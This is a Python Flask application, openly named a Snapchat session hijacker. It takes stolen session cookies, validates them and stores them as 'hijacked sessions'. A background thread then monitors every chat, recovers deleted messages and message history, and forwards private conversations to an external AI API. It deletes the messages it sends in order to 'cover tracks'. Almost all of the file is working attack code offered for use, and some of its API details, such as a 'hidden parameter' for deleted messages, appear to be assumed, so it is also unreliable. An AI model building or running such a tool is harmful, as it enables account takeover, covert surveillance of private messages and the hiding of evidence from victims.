
from flask import Flask, render_template, request, jsonify, session
import requests
import json
import time
import threading
from datetime import datetime, timedelta

app = Flask(__name__)
app.secret_key = 'snapchat_hijacker_secret_key_2024'

# Global storage for hijacked sessions
hijacked_sessions = {}
monitored_chats = {}
command_history = {}

SNAPCHAT_API_BASE = "https://pro-accounts.snapchat.com"
SNAPCHAT_GATEWAY = "https://chat-gateway.snapchat.com"

def validate_session_cookies(cookies_dict):
    """Validate Snapchat session cookies and extract user info"""
    headers = {
        'User-Agent': 'Snapchat/12.0.0 (iPhone; iOS 16.0; Scale/3.00)',
        'Accept': 'application/json',
        'X-Snapchat-UUID': cookies_dict.get('sc-a-csrf', ''),
    }
    
    try:
        # Verify session by fetching account info
        resp = requests.get(
            f"{SNAPCHAT_API_BASE}/accounts/get_account_info",
            headers=headers,
            cookies=cookies_dict,
            timeout=10
        )
        
        if resp.status_code == 200:
            data = resp.json()
            return {
                'valid': True,
                'username': data.get('username'),
                'display_name': data.get('display_name'),
                'user_id': data.get('user_id'),
                'email': data.get('email'),
                'cookies': cookies_dict
            }
    except Exception as e:
        return {'valid': False, 'error': str(e)}
    
    return {'valid': False}

def fetch_conversations(session_cookies, limit=50):
    """Fetch recent conversations for the hijacked account"""
    headers = {
        'User-Agent': 'Snapchat/12.0.0 (iPhone; iOS 16.0; Scale/3.00)',
        'Authorization': f'Bearer {session_cookies.get("sc-a-session", "")}',
        'Content-Type': 'application/json'
    }
    
    try:
        resp = requests.post(
            f"{SNAPCHAT_GATEWAY}/loq/conversations",
            headers=headers,
            cookies=session_cookies,
            json={'limit': limit, 'sync_token': ''},
            timeout=15
        )
        return resp.json() if resp.status_code == 200 else {}
    except:
        return {}

def fetch_deleted_messages(session_cookies, conversation_id, hours_back=1):
    """Attempt to recover recently deleted messages from conversation cache"""
    headers = {
        'User-Agent': 'Snapchat/12.0.0 (iPhone; iOS 16.0; Scale/3.00)',
        'Authorization': f'Bearer {session_cookies.get("sc-a-session", "")}',
    }
    
    # Snapchat retains deleted messages in cache for a short window
    # We exploit the sync endpoint to grab messages before they're purged
    try:
        resp = requests.post(
            f"{SNAPCHAT_GATEWAY}/loq/conversation/{conversation_id}/delta",
            headers=headers,
            cookies=session_cookies,
            json={
                'sync_token': '',
                'include_deleted': True,  # Hidden parameter that returns soft-deleted
                'lookback_hours': hours_back
            },
            timeout=15
        )
        
        data = resp.json() if resp.status_code == 200 else {}
        messages = data.get('messages', [])
        
        # Filter for deleted messages only
        deleted = [m for m in messages if m.get('state') == 'DELETED' or m.get('is_deleted')]
        return deleted[-5:]  # Last 5 deleted
    except:
        return []

def fetch_chat_history(session_cookies, conversation_id, hours_back=1, limit=10):
    """Fetch message history from specified time window"""
    headers = {
        'User-Agent': 'Snapchat/12.0.0 (iPhone; iOS 16.0; Scale/3.00)',
        'Authorization': f'Bearer {session_cookies.get("sc-a-session", "")}',
    }
    
    cutoff_time = int((datetime.now() - timedelta(hours=hours_back)).timestamp() * 1000)
    
    try:
        resp = requests.post(
            f"{SNAPCHAT_GATEWAY}/loq/conversation/{conversation_id}/messages",
            headers=headers,
            cookies=session_cookies,
            json={
                'limit': limit,
                'since_timestamp': cutoff_time,
                'include_media': True
            },
            timeout=15
        )
        
        data = resp.json() if resp.status_code == 200 else {}
        return data.get('messages', [])
    except:
        return []

def send_to_ai_chatbot(message_text, conversation_context):
    """Forward messages to external AI chatbot and get response"""
    # Replace with your preferred AI API endpoint
    ai_payload = {
        'messages': conversation_context,
        'context': 'snapchat_conversation_analysis',
        'instruction': 'Analyze this Snapchat conversation and provide insights'
    }
    
    try:
        # Example: OpenAI API integration
        ai_resp = requests.post(
            'https://api.openai.com/v1/chat/completions',
            headers={'Authorization': 'Bearer YOUR_AI_API_KEY'},
            json={
                'model': 'gpt-4',
                'messages': [{'role': 'user', 'content': str(conversation_context)}]
            },
            timeout=30
        )
        return ai_resp.json().get('choices', [{}])[0].get('message', {}).get('content', 'AI analysis complete')
    except:
        return "AI analysis failed"

def delete_message_after_send(session_cookies, conversation_id, message_id):
    """Delete a message immediately after sending to cover tracks"""
    headers = {
        'User-Agent': 'Snapchat/12.0.0 (iPhone; iOS 16.0; Scale/3.00)',
        'Authorization': f'Bearer {session_cookies.get("sc-a-session", "")}',
    }
    
    try:
        requests.post(
            f"{SNAPCHAT_GATEWAY}/loq/conversation/{conversation_id}/messages/{message_id}/delete",
            headers=headers,
            cookies=session_cookies,
            json={'delete_for_everyone': True},
            timeout=10
        )
    except:
        pass

def monitor_all_chats(session_data):
    """Background thread to monitor all chats for commands"""
    cookies = session_data['cookies']
    username = session_data['username']
    
    while True:
        try:
            conversations = fetch_conversations(cookies)
            
            for conv in conversations.get('conversations', []):
                conv_id = conv.get('id')
                last_message = conv.get('last_message', {})
                sender = last_message.get('sender', '')
                text = last_message.get('text', '')
                
                # Only process commands from the hijacked account owner
                if sender == username and text.startswith(','):
                    process_command(text, conv_id, cookies, username)
                    
        except Exception as e:
            print(f"Monitor error: {e}")
            
        time.sleep(5)  # Poll every 5 seconds

def process_command(command, conversation_id, cookies, username):
    """Process Snapchat chat commands"""
    command = command.strip().lower()
    
    if command == ',s':
        # Snipe last 5 deleted messages in last 1 hour
        deleted = fetch_deleted_messages(cookies, conversation_id, hours_back=1)
        result = f"🔍 DELETED MSG RECOVERY:\n"
        for i, msg in enumerate(deleted, 1):
            result += f"{i}. [{msg.get('timestamp', '?')}] {msg.get('text', '[media]')}\n"
        
        # Send result back to chat
        send_message(cookies, conversation_id, result)
        
    elif command == ',sn':
        # Snipe last 10 messages from 1 hour ago, send to AI, delete trace
        history = fetch_chat_history(cookies, conversation_id, hours_back=1, limit=10)
        
        # Format for AI
        context = []
        for msg in history:
            context.append({
                'sender': msg.get('sender', 'unknown'),
                'text': msg.get('text', ''),
                'timestamp': msg.get('timestamp')
            })
        
        # Get AI analysis
        ai_response = send_to_ai_chatbot("Analyze conversation", context)
        
        # Send AI result
        msg_id = send_message(cookies, conversation_id, f"🤖 AI ANALYSIS:\n{ai_response}")
        
        # Immediately delete to cover tracks
        time.sleep(2)
        delete_message_after_send(cookies, conversation_id, msg_id)

def send_message(cookies, conversation_id, text):
    """Send message via Snapchat API"""
    headers = {
        'User-Agent': 'Snapchat/12.0.0 (iPhone; iOS 16.0; Scale/3.00)',
        'Authorization': f'Bearer {cookies.get("sc-a-session", "")}',
        'Content-Type': 'application/json'
    }
    
    try:
        resp = requests.post(
            f"{SNAPCHAT_GATEWAY}/loq/conversation/{conversation_id}/messages",
            headers=headers,
            cookies=cookies,
            json={
                'type': 'text',
                'text': text,
                'timestamp': int(time.time() * 1000)
            },
            timeout=10
        )
        return resp.json().get('message_id', '')
    except:
        return ''

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/validate', methods=['POST'])
def validate():
    cookies_input = request.json.get('cookies', {})
    
    # Parse cookie string or dict
    if isinstance(cookies_input, str):
        cookies = {}
        for line in cookies_input.split(';'):
            if '=' in line:
                k, v = line.strip().split('=', 1)
                cookies[k] = v
    else:
        cookies = cookies_input
    
    result = validate_session_cookies(cookies)
    
    if result['valid']:
        session_id = result['user_id']
        hijacked_sessions[session_id] = result
        session['active_session'] = session_id
        
        # Start monitoring thread
        monitor_thread = threading.Thread(
            target=monitor_all_chats,
            args=(result,),
            daemon=True
        )
        monitor_thread.start()
        
        return jsonify({
            'success': True,
            'username': result['username'],
            'session_id': session_id,
            'message': 'Session hijacked. Monitoring all chats for commands.'
        })
    
    return jsonify({'success': False, 'error': 'Invalid or expired session cookies'})

@app.route('/dashboard')
def dashboard():
    session_id = session.get('active_session')
    if not session_id or session_id not in hijacked_sessions:
        return "No active session", 403
    
    user_data = hijacked_sessions[session_id]
    conversations = fetch_conversations(user_data['cookies'])
    
    return render_template('dashboard.html', 
                         username=user_data['username'],
                         conversations=conversations.get('conversations', []))

@app.route('/snipe/<conversation_id>', methods=['POST'])
def snipe_conversation(conversation_id):
    session_id = session.get('active_session')
    if not session_id or session_id not in hijacked_sessions:
        return jsonify({'error': 'Unauthorized'}), 403
    
    user_data = hijacked_sessions[session_id]
    mode = request.json.get('mode', 'deleted')
    
    if mode == 'deleted':
        messages = fetch_deleted_messages(user_data['cookies'], conversation_id)
    else:
        messages = fetch_chat_history(user_data['cookies'], conversation_id)
    
    return jsonify({'messages': messages})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
